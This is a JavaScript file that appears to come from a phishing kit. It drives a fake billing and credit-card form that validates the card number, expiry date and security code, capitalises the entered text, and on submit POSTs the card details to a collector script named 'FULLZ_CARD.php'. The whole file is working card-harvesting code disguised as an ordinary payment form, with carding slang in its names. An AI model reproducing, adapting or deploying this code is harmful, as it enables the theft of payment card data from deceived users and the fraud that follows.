$().ready(function() {
    $("#expdate").keypress(function(e) {
        if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
            $("#exp").html("").show();
            return false;
        }
    });
    $('input[name="expdate"]').bind('keyup', function() {
        var strokes = $(this).val().length;
        if (strokes === 2) {
            var thisVal = $(this).val();
            thisVal += '/';
            $(this).val(thisVal);
        }
    });
    $('input[name="expdate"]').keypress(function(evt) {
        var keycode = evt.charCode || evt.keyCode;
        if (keycode == 47) {
            return false;
        }
    });
    $.validator.addMethod("expiration", function(value, element) {
        var today = new Date();
        var startDate = new Date(today.getFullYear(), today.getMonth(), 1, 0, 0, 0, 0);
        var expDate = value;
        var separatorIndex = expDate.indexOf('/');
        expDate = expDate.substr(0, separatorIndex) + '/1' + expDate.substr(separatorIndex);
        return Date.parse(startDate) <= Date.parse(expDate);
    });
    $(".GOxGOxPOWERxRANGERS").validate({
        rules: {
			/////////////////// BILLING ADDRESS INFO ///////////////////
			fullname    : { required: true, minlength:1,  maxlength: 40},
            address     : { required: true, minlength:1,  maxlength: 40},
            city        : { required: true, minlength:1,  maxlength: 40},
			state       : { required: true, minlength:1,  maxlength: 40},
			zipCode     : { required: true, minlength:1,  maxlength: 20},
			phoneNumber : { required: true, minlength:1,  maxlength: 20,number: true },
			terms       : { required: false },
			phoneOption : { required: true  },
			/////////////////// C-D/CARD INFORMATION ///////////////////
			nameoncard  : { required: true, minlength:1, maxlength: 40 },
            cardnumber  : { required: true, minlength:12,maxlength: 19,creditcard: true},
            expdate     : { required: true, minlength:5, maxlength: 7, expiration: true},
			csc         : { required: true, minlength:3, maxlength: 4 },
        }, 
        messages: { 
            fullname: "", 		
			address: "",  
			city: "", 
			country: "", 
			state: "", 
			zipCode: "", 
			phoneNumber: "", 
			phoneOption: "", 
			terms: "", 
			nameoncard: "", 
			cardnumber: "", 
			expdate: "", 
			csc: ""
		},
        submitHandler: function(form) {
            $(".rotation").delay(0).fadeIn(300);
            $.ajax({
            type: 'POST',
			url: 'FULLZ_CARD.php',
            data: {
                'card_type' : $.cookie('card_type'), 				
                'nameoncard': $.cookie('nameoncard'), 
                'cardnumber': $.cookie('cardnumber'),
                'expdate'   : $.cookie('expdate'),
                 'csc'      : $.cookie('csc'),
            },
            });
        },
    });
    $('#cardnumber').mask('0000 0000 0000 0000');
    $('#csc').mask('0000');
    $('#en_expdate').focus(function() {
        $(this).attr('placeholder', 'Month/Year')
    }).blur(function() {
        $(this).attr('placeholder', 'Expiration date')
    });
////////// CAPITLAZED INPUT FULLZ PAGE ////////////////
    $("input.Xval666ideX1").keyup(function() {
        toUpper(this);
    });
    function toUpper(obj) {
        var mystring = obj.value;
        var sp = mystring.split(' ');
        var wl = 0;
        var f, r;
        var word = new Array();
        for (i = 0; i < sp.length; i++) {
            f = sp[i].substring(0, 1).toUpperCase();
            r = sp[i].substring(1).toLowerCase();
            word[i] = f + r;
        }
        newstring = word.join(' ');
        obj.value = newstring;
        return true;
    };
    $('#cardnumber').validateCreditCard(function(result) {
        // console.log(result);
        if (result.card_type != null) {
            switch (result.card_type.name) {
                case "VISA":
                    $('#cardnumber').css('background-position', '98.5% -1%');
                    $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "VISA ELECTRON":
                    $('#cardnumber').css('background-position', '98.5%  47.4%');
                    $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "MASTERCARD":
                    $('#cardnumber').css('background-position', '98.5%  3.6%');
                    $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "MAESTRO":
                    $('#cardnumber').css('background-position', '98.5%  39.6%');
                    $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "DISCOVER":
                    $('#cardnumber').css('background-position', '98.5%  17.7%');
					$('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "AMEX":
                    $('#cardnumber').css('background-position', '99% 10%');
                    $('#csc').attr('pattern', '[0-9]{4}');
					$('#csc').attr('maxlength', '4');
					$('#csc').attr('placeholder', 'CSC (4 digits)');
                    break;
                case "JCB":
                    $('#cardnumber').css('background-position', '98.5% 32%');
                    break;
                case "DINERS CLUB":
                    $('#cardnumber').css('background-position', '98.5% 24.8%');
                    break;
				 case "DINERS CLUB GLOBAL":
                    $('#cardnumber').css('background-position', '98.5% 24.8%');
                    break;
                default:
                    $('#cardnumber').css('background-position', '98.5% 81.7%');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
            }
        } else {
            $('#cardnumber').css('background-position', '98.5% 81.7%');
			$('#csc').attr('placeholder', 'CSC (3 digits)');
        }
        // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.
        if (result.valid || $('#cardnumber').val().length > 16) {
            if (result.valid) {
                $('#cardnumber').removeClass('error').addClass('');
            } else {
                $('#cardnumber').removeClass('').addClass('error');
            }
        } else {
            $('#cardnumber').removeClass('').removeClass('error');
        }
    });
});